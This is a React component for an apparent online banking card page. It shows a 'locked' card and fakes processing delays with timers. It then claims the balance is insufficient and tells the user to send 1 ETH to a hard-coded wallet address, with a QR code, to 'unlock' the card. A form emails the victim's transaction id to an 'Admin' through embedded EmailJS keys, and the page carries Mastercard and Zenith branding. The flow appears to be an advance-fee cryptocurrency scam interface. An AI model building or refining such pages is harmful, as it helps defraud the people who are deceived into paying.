import {
  BsArrowDownCircle,
  BsCreditCard2Back,
  BsInfoCircle,
} from 'react-icons/bs';
import { IoLockClosedOutline } from 'react-icons/io5';
import { HiCurrencyDollar, HiCurrencyEuro } from 'react-icons/hi2';
import { TbShieldLock } from 'react-icons/tb';
import Modal from '../../components/common/Modal';
import { useState } from 'react';
import PaymentForm from './components/ui/CreditCard';
import Switch from './components/ui/Switch';
import { useGlobalStore } from '../../store/Context';
import Button from './components/ui/Button';
import { FaTimes } from 'react-icons/fa';
import masterlogo from '../../assets/masterlogo.webp';
import zenithlogo from '../../assets/ZenithpayU.png';
import eth from '../../assets/eth.png';
import qr from '../../assets/qr.jpeg';
import { IoSwapHorizontalOutline } from 'react-icons/io5';
import { copyText } from '../../../functions/copyText';
import emailjs from '@emailjs/browser';
import { ToastContainer, toast } from 'react-toastify';

function Cards() {
  const [isOpen, setIsOpen] = useState(false);
  const [obtainPin, setObtainPin] = useState(false);
  const [swapConfirmModal, setSwapConfirmModal] = useState(false);
  const [swapConfirmModal2, setSwapConfirmModal2] = useState(false);
  const [paymentModal, setPaymentModal] = useState(false);
  const [tranId, setTranId] = useState('');

  const { setLoader, setPage, userDetail } = useGlobalStore();
  const handleActivateCard = () => {
    alert('Your card is already active');
  };

  const handleCardLock = ({ target }) => {
    // setIsOpen(true);
    if (target.checked) {
      setSwapConfirmModal(true);
    }
  };

  const handlePageChange = (page) => {
    setLoader(true);
    setPage(page);
  };

  const handleObtainPin = () => {
    setLoader(true);
    setTimeout(() => {
      setLoader(false);
      setObtainPin(true);
    }, 2000);
  };

  const handlePaymenyModal = () => {
    setSwapConfirmModal2(false);
    setLoader(true);
    setTimeout(() => {
      setPaymentModal(true), setLoader(false);
    }, 2000);
  };

  const handlePaid = (e) => {
    e.preventDefault();
    setLoader(true);
    const params = {
      message: tranId,
      from_name: `${userDetail.first_name} ${userDetail.last_name}`,
      to_name: 'Admin',
    };
    emailjs
      .send('service_k98a6fk', 'template_5u1qxle', params, {
        publicKey: 'l1SMwkup0_5uqyGfU',
      })
      .then(
        (response) => {
          console.log('SUCCESS!', response.status, response.text);
          setLoader(false);
          toast.success('Notification sent');
          setPaymentModal(false);
        },
        (error) => {
          console.log('FAILED...', error);
          setLoader(false);
          toast.error('Error sending notification');
        }
      );
  };
  return (
    <div className="py-8 space-y-8">
      <ToastContainer />
      <div className="space-y-2">
        <p className="text-gray-400 text-sm">Card Activation</p>
        <div className="bg-white py-3 px-4 rounded-xl shadow flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <BsCreditCard2Back className="text-3xl text-pri" />
            <p className="text-pri text-lg">Activate Card</p>
          </div>
          <Switch handleActivateCard={handleActivateCard} checked={true} />
        </div>
      </div>
      <div className="space-y-2">
        <p className="text-gray-400 text-sm">Card Status</p>
        <div className="bg-white py-3 px-4 rounded-xl shadow flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <IoLockClosedOutline className="text-3xl text-pri" />
            <div className="">
              <p className="text-pri text-lg">Card Locked</p>
              <p className="text-lightgray text-[11px]">
                Purchases are not enabled
              </p>
            </div>
          </div>
          <label className="inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              value="undefined"
              checked={false}
              className="sr-only peer"
              onChange={handleCardLock}
            />
            <div className="relative w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-1 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-blue-600"></div>
          </label>
        </div>
      </div>
      <div className="space-y-2">
        <p className="text-gray-400 text-sm">Card Information</p>
        <div className="bg-white py-3 px-4 rounded-xl shadow ">
          <div className="flex flex-col space-y-2 md:space-y-0 md:flex items-center justify-between border-b py-2">
            <div className="flex items-center space-x-4">
              <TbShieldLock className="text-3xl text-pri" />
              <p className="text-pri text-lg">Your Pin</p>
            </div>
            <button
              type="button"
              onClick={handleObtainPin}
              className="w-80 py-2 text-sm text-white rounded-xl bg-pri hover:bg-[#4E1CFF] transition-all ease-in-out duration-300 cursor-pointer"
            >
              Obtain your pin
            </button>
          </div>
          <div className="flex flex-col space-y-2 md:space-y-0 md:flex items-center justify-between border-b py-2">
            <div className="flex items-center space-x-4">
              <BsArrowDownCircle className="text-3xl text-pri" />
              <p className="text-pri text-lg">Deposit</p>
            </div>
            <button
              type="button"
              onClick={() => handlePageChange('deposit')}
              className="w-80 py-2 text-sm text-white rounded-xl bg-pri hover:bg-[#4E1CFF] transition-all ease-in-out duration-300 cursor-pointer"
            >
              Fund your card
            </button>
          </div>
          <div className="flex items-center justify-between py-2">
            <div className="flex items-center space-x-4">
              <div className="relative w-8 h-8">
                <HiCurrencyEuro className="text-pri absolute text-xl" />
                <HiCurrencyDollar className="text-pri absolute bottom-0 right-0 text-2xl" />
              </div>
              <p className="text-pri text-lg">Balance</p>
            </div>
            <p className="text-3xl font-bold">
              &#36; <span>{userDetail?.balance || 0}</span>
            </p>
          </div>
        </div>
      </div>
      <PaymentForm />
      <Modal isOpen={obtainPin} onClose={() => setObtainPin(false)}>
        <div className="flex flex-col justify-center items-center">
          <BsInfoCircle />
          <p className="text-sm text-center mt-5">Unlock your card first</p>
          <div className="border-t w-full mt-4 text-center py-2 text-center items-center  space-x-8">
            <p
              className="text-pri cursor-pointer"
              onClick={() => setObtainPin(false)}
            >
              Okay
            </p>
          </div>
        </div>
      </Modal>
      <Modal
        isOpen={swapConfirmModal}
        onClose={() => setSwapConfirmModal(false)}
      >
        <div className="flex flex-col justify-center items-center">
          <BsInfoCircle />
          <p className="my-4">Card Status</p>
          <p className="text-sm text-center">
            There will be a deduction from your card balance to unlock your
            card. Click 'Okay' to continue
          </p>
          <div className="border-t w-full mt-4 text-center py-2 grid grid-cols-2 items-center  space-x-8">
            <p
              className="text-pri border-r"
              onClick={() => setSwapConfirmModal(false)}
            >
              Cancel
            </p>
            <p
              className="text-pri cursor-pointer"
              onClick={() => {
                setSwapConfirmModal(false);
                setLoader(true);
                setTimeout(() => {
                  setLoader(false);
                  setSwapConfirmModal2(true);
                }, 3000);
              }}
            >
              Okay
            </p>
          </div>
        </div>
      </Modal>
      <Modal
        isOpen={swapConfirmModal2}
        onClose={() => setSwapConfirmModal2(false)}
      >
        <div className="flex flex-col justify-center items-center">
          <BsInfoCircle />
          <p className="my-4">Swap Request</p>
          <p className="text-sm text-center">
            Insufficient funds in your Card Balance. You have €{' '}
            {userDetail?.balance || 0.0} in your Dollar balance.
          </p>
          <p className="text-sm text-center">
            Swap from your DOLLAR balance to your Card balance to continue
          </p>
          <Button
            textContent={'Swap from Dollar to Card'}
            styles={'bg-pri text-white py-1 rounded-lg my-3'}
            callback={handlePaymenyModal}
          />
          <p className="text-sm text-center">
            For more info, please click the link below and read the card
            information in sections 5a to 5e.
          </p>
          <a
            href="https://drive.google.com/file/d/1bNUj5padPi7fEdnHhiqq4odaaCQzG7OJ/view?usp=sharing"
            target="_blank"
            className="w-64 mx-auto text-[12px] text-pri text-center"
          >
            Read card information
          </a>
          <div className="border-t w-full mt-4 text-center py-2 text-center items-center  space-x-8">
            <p
              className="text-pri cursor-pointer"
              onClick={() => setSwapConfirmModal2(false)}
            >
              Okay
            </p>
          </div>
        </div>
      </Modal>
      {paymentModal ? (
        <div className="fixed overflow-scroll inset-0 bg-gray-600 bg-opacity-75 md:flex md:justify-center md:items-center px-5 z-50">
          <div className="bg-white rounded-lg w-auto rounded-md">
            <div className="md:w-[80vw] pb-5">
              <div className="top bg-black py-2 h-[25%] w-full flex justify-between items-center px-5">
                <div className="">
                  <div className="flex text-white items-center space-x-6">
                    <img src={masterlogo} alt="" width={100} />
                    <p className="text-2xl">Master Card</p>
                  </div>
                  <p className="text2xl text-white my-3">539983266730****</p>
                </div>
                <FaTimes
                  className="text-3xl text-white cursor-pointer"
                  onClick={() => setPaymentModal(false)}
                />
              </div>
              <div className="flex flex-col justify-center items-center px-2">
                <div className="flex items-center space-x-4 w-full justify-center">
                  <img src={masterlogo} alt="" width={100} />
                  <IoSwapHorizontalOutline />
                  <img src={zenithlogo} alt="" width={200} />
                </div>
                <p className="text-neutral text-center text-sm md:text-base">
                  Transfer <span className="text-pri font-bold">1 ETH</span> to
                  the wallet below to complete your card unlock and currency
                  swap
                </p>
                <div className="w-full bg-neutral py-6 text-center text-white text-sm md:text-base">
                  <p>
                    This will be used to unlock your card to enable transfer of
                    fund and crypto across banks and wallet
                  </p>
                </div>
                <div className="flex justify-center items-center space-x-4 py-2">
                  <div className="flex items-center space-x-2 text-xs">
                    <p className="text-neutral">Currency -</p>
                    <img src={eth} alt="" className="w-7 h-7" />
                    <p>ETH</p>
                  </div>
                  <div className="flex items-center space-x-1 text-xs">
                    <p className="text-neutral">Network -</p>
                    <p>ERC20</p>
                  </div>
                </div>
                <div className="flex flex-col md:flex-row md:w-[70%] mx-auto px-3">
                  <div className="col flex flex-col items-center justify-center">
                    <p>Scan to pay</p>
                    <img src={qr} alt="qr" width={'40%'} />
                  </div>
                  <div className="col">
                    <p>Address</p>
                    <p className="my-5 text-neutral text-center text-[12px] md:text-base">
                      0xA3BaC29Dc409f0d14379aFfEbdCb3c4E141dCD9A
                    </p>
                    <div
                      className="w-full bg-pri text-white py-2 hover:bg-hover cursor-pointer text-center"
                      onClick={() =>
                        copyText('0xA3BaC29Dc409f0d14379aFfEbdCb3c4E141dCD9A')
                      }
                    >
                      Copy Address
                    </div>
                  </div>
                </div>
                <form
                  onSubmit={handlePaid}
                  className="my-10 flex flex-col items-center justify-center w-[50%]"
                >
                  <input
                    type="text"
                    placeholder="Paste your transaction id"
                    required
                    onChange={(e) => setTranId(e.target.value)}
                    className="w-full border placeholder:text-sm py-2 px-2 rounded-md mb-3"
                  />
                  <button
                    type="submit"
                    className="bg-pri w-auto text-white rounded-md px-10 text-sm py-2"
                  >
                    I have paid
                  </button>
                </form>
              </div>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
}

export default Cards;
